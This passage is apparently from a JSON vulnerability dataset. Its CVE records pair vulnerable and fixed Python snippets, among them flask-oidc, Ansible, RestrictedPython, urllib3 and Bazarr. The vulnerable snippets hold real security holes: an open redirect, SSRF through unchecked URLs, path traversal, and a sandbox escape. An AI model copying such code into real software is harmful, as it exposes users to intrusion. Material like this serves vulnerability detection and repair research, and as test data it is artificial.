        "snippet": "    def init_app(self, app):\n        \"\"\"\n        Do setup that requires a Flask app.\n        \"\"\"\n        self.app = app\n\n        # Set some default configuration options\n        app.config.setdefault('OIDC_SCOPES', ['openid', 'email'])\n        app.config.setdefault('OIDC_GOOGLE_APPS_DOMAIN', None)\n        app.config.setdefault('OIDC_ID_TOKEN_COOKIE_NAME', 'oidc_id_token')\n        app.config.setdefault('OIDC_ID_TOKEN_COOKIE_TTL', 7 * 86400)  # 7 days\n        # should ONLY be turned off for local debugging\n        app.config.setdefault('OIDC_ID_TOKEN_COOKIE_SECURE', True)\n        app.config.setdefault('OIDC_VALID_ISSUERS',\n                              ['accounts.google.com',\n                               'https://accounts.google.com'])\n        app.config.setdefault('OIDC_CLOCK_SKEW', 60)  # 1 minute\n        app.config.setdefault('OIDC_REQUIRE_VERIFIED_EMAIL', True)\n\n        # register callback route and cookie-setting decorator\n        app.route('/oidc_callback')(self.oidc_callback)\n        app.before_request(self.before_request)\n        app.after_request(self.after_request)\n\n        # load client_secrets.json\n        self.flow = flow_from_clientsecrets(\n            app.config['OIDC_CLIENT_SECRETS'],\n            scope=app.config['OIDC_SCOPES'])\n        assert isinstance(self.flow, OAuth2WebServerFlow)\n\n        # create a cookie signer using the Flask secret key\n        self.cookie_serializer = TimedJSONWebSignatureSerializer(\n            app.config['SECRET_KEY'])\n\n        try:\n            self.credentials_store = app.config['OIDC_CREDENTIALS_STORE']\n        except KeyError:\n            pass"
      },
      {
        "id": "vul_py_177_2",
        "commit": "e4ce56a",
        "file_path": "flask_oidc/__init__.py",
        "start_line": 191,
        "end_line": 213,
        "snippet": "    def redirect_to_auth_server(self, destination):\n        \"\"\"\n        Set a CSRF token in the session, and redirect to the IdP.\n        :param destination: the page that the user was going to,\n                            before we noticed they weren't logged in\n        :return: a redirect response\n        \"\"\"\n        csrf_token = b64encode(self.urandom(24)).decode('utf-8')\n        session['oidc_csrf_token'] = csrf_token\n        state = {\n            'csrf_token': csrf_token,\n            'destination': destination,\n        }\n        extra_params = {\n            'state': json.dumps(state),\n        }\n        flow = self.flow_for_request()\n        auth_url = '{url}&{extra_params}'.format(\n            url=flow.step1_get_authorize_url(),\n            extra_params=urlencode(extra_params))\n        # if the user has an ID token, it's invalid, or we wouldn't be here\n        self.set_cookie_id_token(None)\n        return redirect(auth_url)"
      },
      {
        "id": "vul_py_177_3",
        "commit": "e4ce56a",
        "file_path": "flask_oidc/__init__.py",
        "start_line": 282,
        "end_line": 329,
        "snippet": "    def oidc_callback(self):\n        \"\"\"\n        Exchange the auth code for actual credentials,\n        then redirect to the originally requested page.\n        \"\"\"\n        # retrieve session and callback variables\n        try:\n            session_csrf_token = session.pop('oidc_csrf_token')\n\n            state = json.loads(request.args['state'])\n            csrf_token = state['csrf_token']\n            destination = state['destination']\n\n            code = request.args['code']\n        except (KeyError, ValueError):\n            logger.debug(\"Can't retrieve CSRF token, state, or code\",\n                         exc_info=True)\n            return self.oidc_error()\n\n        # check callback CSRF token passed to IdP\n        # against session CSRF token held by user\n        if csrf_token != session_csrf_token:\n            logger.debug(\"CSRF token mismatch\")\n            return self.oidc_error()\n\n        # make a request to IdP to exchange the auth code for OAuth credentials\n        flow = self.flow_for_request()\n        credentials = flow.step2_exchange(code, http=self.http)\n        id_token = credentials.id_token\n        if not self.is_id_token_valid(id_token):\n            logger.debug(\"Invalid ID token\")\n            if id_token.get('hd') != self.app.config['OIDC_GOOGLE_APPS_DOMAIN']:\n                return self.oidc_error(\n                    \"You must log in with an account from the {0} domain.\"\n                    .format(self.app.config['OIDC_GOOGLE_APPS_DOMAIN']),\n                    self.WRONG_GOOGLE_APPS_DOMAIN)\n            return self.oidc_error()\n\n        # store credentials by subject\n        # when Google is the IdP, the subject is their G+ account number\n        self.credentials_store[id_token['sub']] = credentials\n\n        # set a persistent signed cookie containing the ID token\n        # and redirect to the final destination\n        # TODO: validate redirect destination\n        response = redirect(destination)\n        self.set_cookie_id_token(id_token)\n        return response"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_177_1",
        "commit": "f2ef8b4",
        "file_path": "flask_oidc/__init__.py",
        "start_line": 51,
        "end_line": 90,
        "snippet": "    def init_app(self, app):\n        \"\"\"\n        Do setup that requires a Flask app.\n        \"\"\"\n        self.app = app\n\n        # Set some default configuration options\n        app.config.setdefault('OIDC_SCOPES', ['openid', 'email'])\n        app.config.setdefault('OIDC_GOOGLE_APPS_DOMAIN', None)\n        app.config.setdefault('OIDC_ID_TOKEN_COOKIE_NAME', 'oidc_id_token')\n        app.config.setdefault('OIDC_ID_TOKEN_COOKIE_TTL', 7 * 86400)  # 7 days\n        # should ONLY be turned off for local debugging\n        app.config.setdefault('OIDC_ID_TOKEN_COOKIE_SECURE', True)\n        app.config.setdefault('OIDC_VALID_ISSUERS',\n                              ['accounts.google.com',\n                               'https://accounts.google.com'])\n        app.config.setdefault('OIDC_CLOCK_SKEW', 60)  # 1 minute\n        app.config.setdefault('OIDC_REQUIRE_VERIFIED_EMAIL', True)\n\n        # register callback route and cookie-setting decorator\n        app.route('/oidc_callback')(self.oidc_callback)\n        app.before_request(self.before_request)\n        app.after_request(self.after_request)\n\n        # load client_secrets.json\n        self.flow = flow_from_clientsecrets(\n            app.config['OIDC_CLIENT_SECRETS'],\n            scope=app.config['OIDC_SCOPES'])\n        assert isinstance(self.flow, OAuth2WebServerFlow)\n\n        # create signers using the Flask secret key\n        self.destination_serializer = JSONWebSignatureSerializer(\n            app.config['SECRET_KEY'])\n        self.cookie_serializer = TimedJSONWebSignatureSerializer(\n            app.config['SECRET_KEY'])\n\n        try:\n            self.credentials_store = app.config['OIDC_CREDENTIALS_STORE']\n        except KeyError:\n            pass"
      },
      {
        "id": "fix_py_177_2",
        "commit": "f2ef8b4",
        "file_path": "flask_oidc/__init__.py",
        "start_line": 194,
        "end_line": 217,
        "snippet": "    def redirect_to_auth_server(self, destination):\n        \"\"\"\n        Set a CSRF token in the session, and redirect to the IdP.\n        :param destination: the page that the user was going to,\n                            before we noticed they weren't logged in\n        :return: a redirect response\n        \"\"\"\n        destination = self.destination_serializer.dumps(destination)\n        csrf_token = b64encode(self.urandom(24)).decode('utf-8')\n        session['oidc_csrf_token'] = csrf_token\n        state = {\n            'csrf_token': csrf_token,\n            'destination': destination,\n        }\n        extra_params = {\n            'state': json.dumps(state),\n        }\n        flow = self.flow_for_request()\n        auth_url = '{url}&{extra_params}'.format(\n            url=flow.step1_get_authorize_url(),\n            extra_params=urlencode(extra_params))\n        # if the user has an ID token, it's invalid, or we wouldn't be here\n        self.set_cookie_id_token(None)\n        return redirect(auth_url)"
      },
      {
        "id": "fix_py_177_3",
        "commit": "f2ef8b4",
        "file_path": "flask_oidc/__init__.py",
        "start_line": 286,
        "end_line": 339,
        "snippet": "    def oidc_callback(self):\n        \"\"\"\n        Exchange the auth code for actual credentials,\n        then redirect to the originally requested page.\n        \"\"\"\n        # retrieve session and callback variables\n        try:\n            session_csrf_token = session.pop('oidc_csrf_token')\n\n            state = json.loads(request.args['state'])\n            csrf_token = state['csrf_token']\n            destination = state['destination']\n\n            code = request.args['code']\n        except (KeyError, ValueError):\n            logger.debug(\"Can't retrieve CSRF token, state, or code\",\n                         exc_info=True)\n            return self.oidc_error()\n\n        # check callback CSRF token passed to IdP\n        # against session CSRF token held by user\n        if csrf_token != session_csrf_token:\n            logger.debug(\"CSRF token mismatch\")\n            return self.oidc_error()\n\n        # make a request to IdP to exchange the auth code for OAuth credentials\n        flow = self.flow_for_request()\n        credentials = flow.step2_exchange(code, http=self.http)\n        id_token = credentials.id_token\n        if not self.is_id_token_valid(id_token):\n            logger.debug(\"Invalid ID token\")\n            if id_token.get('hd') != self.app.config['OIDC_GOOGLE_APPS_DOMAIN']:\n                return self.oidc_error(\n                    \"You must log in with an account from the {0} domain.\"\n                    .format(self.app.config['OIDC_GOOGLE_APPS_DOMAIN']),\n                    self.WRONG_GOOGLE_APPS_DOMAIN)\n            return self.oidc_error()\n\n        # store credentials by subject\n        # when Google is the IdP, the subject is their G+ account number\n        self.credentials_store[id_token['sub']] = credentials\n\n        # Check whether somebody messed with the destination\n        destination = destination\n        try:\n            response = redirect(self.destination_serializer.loads(destination))\n        except BadSignature:\n            logger.error('Destination signature did not match. Rogue IdP?')\n            response = redirect('/')\n\n        # set a persistent signed cookie containing the ID token\n        # and redirect to the final destination\n        self.set_cookie_id_token(id_token)\n        return response"
      }
    ],
    "vul_patch": "--- a/flask_oidc/__init__.py\n+++ b/flask_oidc/__init__.py\n@@ -28,7 +28,9 @@\n             scope=app.config['OIDC_SCOPES'])\n         assert isinstance(self.flow, OAuth2WebServerFlow)\n \n-        # create a cookie signer using the Flask secret key\n+        # create signers using the Flask secret key\n+        self.destination_serializer = JSONWebSignatureSerializer(\n+            app.config['SECRET_KEY'])\n         self.cookie_serializer = TimedJSONWebSignatureSerializer(\n             app.config['SECRET_KEY'])\n \n\n--- a/flask_oidc/__init__.py\n+++ b/flask_oidc/__init__.py\n@@ -5,6 +5,7 @@\n                             before we noticed they weren't logged in\n         :return: a redirect response\n         \"\"\"\n+        destination = self.destination_serializer.dumps(destination)\n         csrf_token = b64encode(self.urandom(24)).decode('utf-8')\n         session['oidc_csrf_token'] = csrf_token\n         state = {\n\n--- a/flask_oidc/__init__.py\n+++ b/flask_oidc/__init__.py\n@@ -40,9 +40,15 @@\n         # when Google is the IdP, the subject is their G+ account number\n         self.credentials_store[id_token['sub']] = credentials\n \n+        # Check whether somebody messed with the destination\n+        destination = destination\n+        try:\n+            response = redirect(self.destination_serializer.loads(destination))\n+        except BadSignature:\n+            logger.error('Destination signature did not match. Rogue IdP?')\n+            response = redirect('/')\n+\n         # set a persistent signed cookie containing the ID token\n         # and redirect to the final destination\n-        # TODO: validate redirect destination\n-        response = redirect(destination)\n         self.set_cookie_id_token(id_token)\n         return response\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-34094",
    "cve_description": "ChuanhuChatGPT is a graphical user interface for ChatGPT and many large language models. A vulnerability in versions 20230526 and prior allows unauthorized access to the config.json file of the privately deployed ChuanghuChatGPT project, when authentication is not configured. The attacker can exploit this vulnerability to steal the API keys in the configuration file. The vulnerability has been fixed in commit bfac445. As a workaround, setting up access authentication can help mitigate the vulnerability.",
    "cwe_info": {
      "CWE-306": {
        "name": "Missing Authentication for Critical Function",
        "description": "The product does not perform any authentication for functionality that requires a provable user identity or consumes a significant amount of resources."
      }
    },
    "repo": "https://github.com/GaiZhenbiao/ChuanhuChatGPT",
    "patch_url": [
      "https://github.com/GaiZhenbiao/ChuanhuChatGPT/commit/bfac445e799c317b0f5e738ab394032a18de62eb"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_90_1",
        "commit": "e121fd7",
        "file_path": "ChuanhuChatbot.py",
        "start_line": "468",
        "end_line": "477",
        "snippet": "if __name__ == \"__main__\":\n    reload_javascript()\n    demo.queue(concurrency_count=CONCURRENT_COUNT).launch(\n        server_name=server_name,\n        server_port=server_port,\n        share=share,\n        auth=auth_list if authflag else None,\n        favicon_path=\"./assets/favicon.ico\",\n        inbrowser=not dockerflag, # \\u7981\\u6b62\\u5728docker\\u4e0b\\u5f00\\u542finbrowser\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_90_1",
        "commit": "bfac445",
        "file_path": "ChuanhuChatbot.py",
        "start_line": "468",
        "end_line": "478",
        "snippet": "if __name__ == \"__main__\":\n    reload_javascript()\n    demo.queue(concurrency_count=CONCURRENT_COUNT).launch(\n        blocked_paths=[\"config.json\"],\n        server_name=server_name,\n        server_port=server_port,\n        share=share,\n        auth=auth_list if authflag else None,\n        favicon_path=\"./assets/favicon.ico\",\n        inbrowser=not dockerflag, # \\u7981\\u6b62\\u5728docker\\u4e0b\\u5f00\\u542finbrowser\n    )"
      }
    ],
    "vul_patch": "--- a/ChuanhuChatbot.py\n+++ b/ChuanhuChatbot.py\n@@ -1,6 +1,7 @@\n if __name__ == \"__main__\":\n     reload_javascript()\n     demo.queue(concurrency_count=CONCURRENT_COUNT).launch(\n+        blocked_paths=[\"config.json\"],\n         server_name=server_name,\n         server_port=server_port,\n         share=share,\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2016-8628",
    "cve_description": "Ansible before version 2.2.0 fails to properly sanitize fact variables sent from the Ansible controller. An attacker with the ability to create special variables on the controller could execute arbitrary commands on Ansible clients as the user Ansible runs as.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/ansible/ansible",
    "patch_url": [
      "https://github.com/ansible/ansible/commit/35938b907dfcd1106ca40b794f0db446bdb8cf09"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_242_1",
        "commit": "bab1ac1",
        "file_path": "lib/ansible/plugins/__init__.py",
        "start_line": 373,
        "end_line": 417,
        "snippet": "    def all(self, *args, **kwargs):\n        ''' instantiates all plugins with the same arguments '''\n\n        class_only = kwargs.pop('class_only', False)\n        all_matches = []\n        found_in_cache = True\n\n        for i in self._get_paths():\n            all_matches.extend(glob.glob(os.path.join(i, \"*.py\")))\n\n        for path in sorted(all_matches, key=lambda match: os.path.basename(match)):\n            name, _ = os.path.splitext(path)\n            if '__init__' in name:\n                continue\n\n            if path not in self._module_cache:\n                self._module_cache[path] = self._load_module_source(name, path)\n                found_in_cache = False\n\n            try:\n                obj = getattr(self._module_cache[path], self.class_name)\n            except AttributeError as e:\n                display.warning(\"Skipping plugin (%s) as it seems to be invalid: %s\" % (path, to_text(e)))\n                continue\n\n            if self.base_class:\n                # The import path is hardcoded and should be the right place,\n                # so we are not expecting an ImportError.\n                module = __import__(self.package, fromlist=[self.base_class])\n                # Check whether this obj has the required base class.\n                try:\n                    plugin_class = getattr(module, self.base_class)\n                except AttributeError:\n                    continue\n                if not issubclass(obj, plugin_class):\n                    continue\n\n            self._display_plugin_load(self.class_name, name, self._searched_paths, path,\n                                      found_in_cache=found_in_cache, class_only=class_only)\n            if not class_only:\n                obj = obj(*args, **kwargs)\n\n            # set extra info on the module, in case we want it later\n            setattr(obj, '_original_path', path)\n            yield obj"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_242_1",
        "commit": "35938b9",
        "file_path": "lib/ansible/plugins/__init__.py",
        "start_line": 373,
        "end_line": 422,
        "snippet": "    def all(self, *args, **kwargs):\n        ''' instantiates all plugins with the same arguments '''\n\n        path_only = kwargs.pop('path_only', False)\n        class_only = kwargs.pop('class_only', False)\n        all_matches = []\n        found_in_cache = True\n\n        for i in self._get_paths():\n            all_matches.extend(glob.glob(os.path.join(i, \"*.py\")))\n\n        for path in sorted(all_matches, key=lambda match: os.path.basename(match)):\n            name, _ = os.path.splitext(path)\n            if '__init__' in name:\n                continue\n\n            if path_only:\n                yield path\n                continue\n\n            if path not in self._module_cache:\n                self._module_cache[path] = self._load_module_source(name, path)\n                found_in_cache = False\n\n            try:\n                obj = getattr(self._module_cache[path], self.class_name)\n            except AttributeError as e:\n                display.warning(\"Skipping plugin (%s) as it seems to be invalid: %s\" % (path, to_text(e)))\n                continue\n\n            if self.base_class:\n                # The import path is hardcoded and should be the right place,\n                # so we are not expecting an ImportError.\n                module = __import__(self.package, fromlist=[self.base_class])\n                # Check whether this obj has the required base class.\n                try:\n                    plugin_class = getattr(module, self.base_class)\n                except AttributeError:\n                    continue\n                if not issubclass(obj, plugin_class):\n                    continue\n\n            self._display_plugin_load(self.class_name, name, self._searched_paths, path,\n                                      found_in_cache=found_in_cache, class_only=class_only)\n            if not class_only:\n                obj = obj(*args, **kwargs)\n\n            # set extra info on the module, in case we want it later\n            setattr(obj, '_original_path', path)\n            yield obj"
      }
    ],
    "vul_patch": "--- a/lib/ansible/plugins/__init__.py\n+++ b/lib/ansible/plugins/__init__.py\n@@ -1,6 +1,7 @@\n     def all(self, *args, **kwargs):\n         ''' instantiates all plugins with the same arguments '''\n \n+        path_only = kwargs.pop('path_only', False)\n         class_only = kwargs.pop('class_only', False)\n         all_matches = []\n         found_in_cache = True\n@@ -11,6 +12,10 @@\n         for path in sorted(all_matches, key=lambda match: os.path.basename(match)):\n             name, _ = os.path.splitext(path)\n             if '__init__' in name:\n+                continue\n+\n+            if path_only:\n+                yield path\n                 continue\n \n             if path not in self._module_cache:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2025-22153",
    "cve_description": "RestrictedPython is a tool that helps to define a subset of the Python language which allows to provide a program input into a trusted environment. Via a type confusion bug in versions of the CPython interpreter starting in 3.11 and prior to 3.13.2 when using `try/except*`, RestrictedPython starting in version 6.0 and prior to version 8.0 could be bypassed. The issue is patched in version 8.0 of RestrictedPython by removing support for `try/except*` clauses. No known workarounds are available.",
    "cwe_info": {
      "CWE-843": {
        "name": "Access of Resource Using Incompatible Type ('Type Confusion')",
        "description": "The product allocates or initializes a resource such as a pointer, object, or variable using one type, but it later accesses that resource using a type that is incompatible with the original type."
      }
    },
    "repo": "https://github.com/zopefoundation/RestrictedPython",
    "patch_url": [
      "https://github.com/zopefoundation/RestrictedPython/commit/48a92c5bb617a647cffd0dadd4d5cfe626bcdb2f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_433_1",
        "commit": "f4c1c1b",
        "file_path": "src/RestrictedPython/transformer.py",
        "start_line": 1143,
        "end_line": 1145,
        "snippet": "    def visit_TryStar(self, node):\n        \"\"\"Allow `ExceptionGroup` without restrictions.\"\"\"\n        return self.node_contents_visit(node)"
      },
      {
        "id": "vul_py_433_2",
        "commit": "f4c1c1b",
        "file_path": "src/RestrictedPython/Guards.py",
        "start_line": 109,
        "end_line": 111,
        "snippet": "if IS_PY311_OR_GREATER:\n    _safe_exceptions.append(\"ExceptionGroup\")\n"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_433_1",
        "commit": "48a92c5bb617a647cffd0dadd4d5cfe626bcdb2f",
        "file_path": "src/RestrictedPython/transformer.py",
        "start_line": 1143,
        "end_line": 1145,
        "snippet": "    def visit_TryStar(self, node):\n        \"\"\"Disallow `ExceptionGroup` due to a potential sandbox escape.\"\"\"\n        self.not_allowed(node)"
      }
    ],
    "vul_patch": "--- a/src/RestrictedPython/transformer.py\n+++ b/src/RestrictedPython/transformer.py\n@@ -1,3 +1,3 @@\n     def visit_TryStar(self, node):\n-        \"\"\"Allow `ExceptionGroup` without restrictions.\"\"\"\n-        return self.node_contents_visit(node)\n+        \"\"\"Disallow `ExceptionGroup` due to a potential sandbox escape.\"\"\"\n+        self.not_allowed(node)\n\n--- a/src/RestrictedPython/Guards.py\n+++ /dev/null\n@@ -1,2 +0,0 @@\n-if IS_PY311_OR_GREATER:\n-    _safe_exceptions.append(\"ExceptionGroup\")\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-33503",
    "cve_description": "An issue was discovered in urllib3 before 1.26.5. When provided with a URL containing many @ characters in the authority component, the authority regular expression exhibits catastrophic backtracking, causing a denial of service if a URL were passed as a parameter or redirected to via an HTTP redirect.",
    "cwe_info": {
      "CWE-400": {
        "name": "Uncontrolled Resource Consumption",
        "description": "The product does not properly control the allocation and maintenance of a limited resource."
      }
    },
    "repo": "https://github.com/urllib3/urllib3",
    "patch_url": [
      "https://github.com/urllib3/urllib3/commit/2d4a3fee6de2fa45eb82169361918f759269b4ec"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_425_1",
        "commit": "2698537",
        "file_path": "src/urllib3/util/url.py",
        "start_line": 330,
        "end_line": 422,
        "snippet": "def parse_url(url):\n    \"\"\"\n    Given a url, return a parsed :class:`.Url` namedtuple. Best-effort is\n    performed to parse incomplete urls. Fields not provided will be None.\n    This parser is RFC 3986 compliant.\n\n    The parser logic and helper functions are based heavily on\n    work done in the ``rfc3986`` module.\n\n    :param str url: URL to parse into a :class:`.Url` namedtuple.\n\n    Partly backwards-compatible with :mod:`urlparse`.\n\n    Example::\n\n        >>> parse_url('http://google.com/mail/')\n        Url(scheme='http', host='google.com', port=None, path='/mail/', ...)\n        >>> parse_url('google.com:80')\n        Url(scheme=None, host='google.com', port=80, path=None, ...)\n        >>> parse_url('/foo?bar')\n        Url(scheme=None, host=None, port=None, path='/foo', query='bar', ...)\n    \"\"\"\n    if not url:\n        # Empty\n        return Url()\n\n    source_url = url\n    if not SCHEME_RE.search(url):\n        url = \"//\" + url\n\n    try:\n        scheme, authority, path, query, fragment = URI_RE.match(url).groups()\n        normalize_uri = scheme is None or scheme.lower() in NORMALIZABLE_SCHEMES\n\n        if scheme:\n            scheme = scheme.lower()\n\n        if authority:\n            auth, host, port = SUBAUTHORITY_RE.match(authority).groups()\n            if auth and normalize_uri:\n                auth = _encode_invalid_chars(auth, USERINFO_CHARS)\n            if port == \"\":\n                port = None\n        else:\n            auth, host, port = None, None, None\n\n        if port is not None:\n            port = int(port)\n            if not (0 <= port <= 65535):\n                raise LocationParseError(url)\n\n        host = _normalize_host(host, scheme)\n\n        if normalize_uri and path:\n            path = _remove_path_dot_segments(path)\n            path = _encode_invalid_chars(path, PATH_CHARS)\n        if normalize_uri and query:\n            query = _encode_invalid_chars(query, QUERY_CHARS)\n        if normalize_uri and fragment:\n            fragment = _encode_invalid_chars(fragment, FRAGMENT_CHARS)\n\n    except (ValueError, AttributeError):\n        return six.raise_from(LocationParseError(source_url), None)\n\n    # For the sake of backwards compatibility we put empty\n    # string values for path if there are any defined values\n    # beyond the path in the URL.\n    # TODO: Remove this when we break backwards compatibility.\n    if not path:\n        if query is not None or fragment is not None:\n            path = \"\"\n        else:\n            path = None\n\n    # Ensure that each part of the URL is a `str` for\n    # backwards compatibility.\n    if isinstance(url, six.text_type):\n        ensure_func = six.ensure_text\n    else:\n        ensure_func = six.ensure_str\n\n    def ensure_type(x):\n        return x if x is None else ensure_func(x)\n\n    return Url(\n        scheme=ensure_type(scheme),\n        auth=ensure_type(auth),\n        host=ensure_type(host),\n        port=port,\n        path=ensure_type(path),\n        query=ensure_type(query),\n        fragment=ensure_type(fragment),\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_425_1",
        "commit": "2d4a3fee6de2fa45eb82169361918f759269b4ec",
        "file_path": "src/urllib3/util/url.py",
        "start_line": 330,
        "end_line": 424,
        "snippet": "def parse_url(url):\n    \"\"\"\n    Given a url, return a parsed :class:`.Url` namedtuple. Best-effort is\n    performed to parse incomplete urls. Fields not provided will be None.\n    This parser is RFC 3986 compliant.\n\n    The parser logic and helper functions are based heavily on\n    work done in the ``rfc3986`` module.\n\n    :param str url: URL to parse into a :class:`.Url` namedtuple.\n\n    Partly backwards-compatible with :mod:`urlparse`.\n\n    Example::\n\n        >>> parse_url('http://google.com/mail/')\n        Url(scheme='http', host='google.com', port=None, path='/mail/', ...)\n        >>> parse_url('google.com:80')\n        Url(scheme=None, host='google.com', port=80, path=None, ...)\n        >>> parse_url('/foo?bar')\n        Url(scheme=None, host=None, port=None, path='/foo', query='bar', ...)\n    \"\"\"\n    if not url:\n        # Empty\n        return Url()\n\n    source_url = url\n    if not SCHEME_RE.search(url):\n        url = \"//\" + url\n\n    try:\n        scheme, authority, path, query, fragment = URI_RE.match(url).groups()\n        normalize_uri = scheme is None or scheme.lower() in NORMALIZABLE_SCHEMES\n\n        if scheme:\n            scheme = scheme.lower()\n\n        if authority:\n            auth, _, host_port = authority.rpartition(\"@\")\n            auth = auth or None\n            host, port = _HOST_PORT_RE.match(host_port).groups()\n            if auth and normalize_uri:\n                auth = _encode_invalid_chars(auth, USERINFO_CHARS)\n            if port == \"\":\n                port = None\n        else:\n            auth, host, port = None, None, None\n\n        if port is not None:\n            port = int(port)\n            if not (0 <= port <= 65535):\n                raise LocationParseError(url)\n\n        host = _normalize_host(host, scheme)\n\n        if normalize_uri and path:\n            path = _remove_path_dot_segments(path)\n            path = _encode_invalid_chars(path, PATH_CHARS)\n        if normalize_uri and query:\n            query = _encode_invalid_chars(query, QUERY_CHARS)\n        if normalize_uri and fragment:\n            fragment = _encode_invalid_chars(fragment, FRAGMENT_CHARS)\n\n    except (ValueError, AttributeError):\n        return six.raise_from(LocationParseError(source_url), None)\n\n    # For the sake of backwards compatibility we put empty\n    # string values for path if there are any defined values\n    # beyond the path in the URL.\n    # TODO: Remove this when we break backwards compatibility.\n    if not path:\n        if query is not None or fragment is not None:\n            path = \"\"\n        else:\n            path = None\n\n    # Ensure that each part of the URL is a `str` for\n    # backwards compatibility.\n    if isinstance(url, six.text_type):\n        ensure_func = six.ensure_text\n    else:\n        ensure_func = six.ensure_str\n\n    def ensure_type(x):\n        return x if x is None else ensure_func(x)\n\n    return Url(\n        scheme=ensure_type(scheme),\n        auth=ensure_type(auth),\n        host=ensure_type(host),\n        port=port,\n        path=ensure_type(path),\n        query=ensure_type(query),\n        fragment=ensure_type(fragment),\n    )"
      }
    ],
    "vul_patch": "--- a/src/urllib3/util/url.py\n+++ b/src/urllib3/util/url.py\n@@ -36,7 +36,9 @@\n             scheme = scheme.lower()\n \n         if authority:\n-            auth, host, port = SUBAUTHORITY_RE.match(authority).groups()\n+            auth, _, host_port = authority.rpartition(\"@\")\n+            auth = auth or None\n+            host, port = _HOST_PORT_RE.match(host_port).groups()\n             if auth and normalize_uri:\n                 auth = _encode_invalid_chars(auth, USERINFO_CHARS)\n             if port == \"\":\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-50266",
    "cve_description": "Bazarr manages and downloads subtitles. In version 1.2.4, the proxy method in bazarr/bazarr/app/ui.py does not validate the user-controlled protocol and url variables and passes them to requests.get() without any sanitization, which leads to a blind server-side request forgery (SSRF). This issue allows for crafting GET requests to internal and external resources on behalf of the server. 1.3.1 contains a partial fix, which limits the vulnerability to HTTP/HTTPS protocols.",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/morpheus65535/bazarr",
    "patch_url": [
      "https://github.com/morpheus65535/bazarr/commit/17add7fbb3ae1919a40d505470d499d46df9ae6b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_185_1",
        "commit": "aa0af3f",
        "file_path": "bazarr/app/ui.py",
        "start_line": 145,
        "end_line": 146,
        "snippet": "def backup_download(filename):\n    return send_file(os.path.join(settings.backup.folder, filename), max_age=0, as_attachment=True)"
      },
      {
        "id": "vul_py_185_2",
        "commit": "aa0af3f",
        "file_path": "bazarr/app/ui.py",
        "start_line": 150,
        "end_line": 152,
        "snippet": "def swaggerui_static(filename):\n    return send_file(os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'libs', 'flask_restx',\n                     'static', filename))"
      },
      {
        "id": "vul_py_185_3",
        "commit": "aa0af3f",
        "file_path": "bazarr/app/ui.py",
        "start_line": 162,
        "end_line": 183,
        "snippet": "def proxy(protocol, url):\n    url = protocol + '://' + unquote(url)\n    params = request.args\n    try:\n        result = requests.get(url, params, allow_redirects=False, verify=False, timeout=5, headers=headers)\n    except Exception as e:\n        return dict(status=False, error=repr(e))\n    else:\n        if result.status_code == 200:\n            try:\n                version = result.json()['version']\n                return dict(status=True, version=version)\n            except Exception:\n                return dict(status=False, error='Error Occurred. Check your settings.')\n        elif result.status_code == 401:\n            return dict(status=False, error='Access Denied. Check API key.')\n        elif result.status_code == 404:\n            return dict(status=False, error='Cannot get version. Maybe unsupported legacy API call?')\n        elif 300 <= result.status_code <= 399:\n            return dict(status=False, error='Wrong URL Base.')\n        else:\n            return dict(status=False, error=result.raise_for_status())"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_185_1",
        "commit": "17add7f",
        "file_path": "bazarr/app/ui.py",
        "start_line": 145,
        "end_line": 150,
        "snippet": "def backup_download(filename):\n    fullpath = os.path.normpath(os.path.join(settings.backup.folder, filename))\n    if not fullpath.startswith(settings.backup.folder):\n        return '', 404\n    else:\n        return send_file(fullpath, max_age=0, as_attachment=True)"
      },
      {
        "id": "fix_py_185_2",
        "commit": "17add7f",
        "file_path": "bazarr/app/ui.py",
        "start_line": 154,
        "end_line": 161,
        "snippet": "def swaggerui_static(filename):\n    basepath = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'libs', 'flask_restx',\n                            'static')\n    fullpath = os.path.join(basepath, filename)\n    if not fullpath.startswith(basepath):\n        return '', 404\n    else:\n        return send_file(fullpath)"
      },
      {
        "id": "fix_py_185_3",
        "commit": "17add7f",
        "file_path": "bazarr/app/ui.py",
        "start_line": 171,
        "end_line": 194,
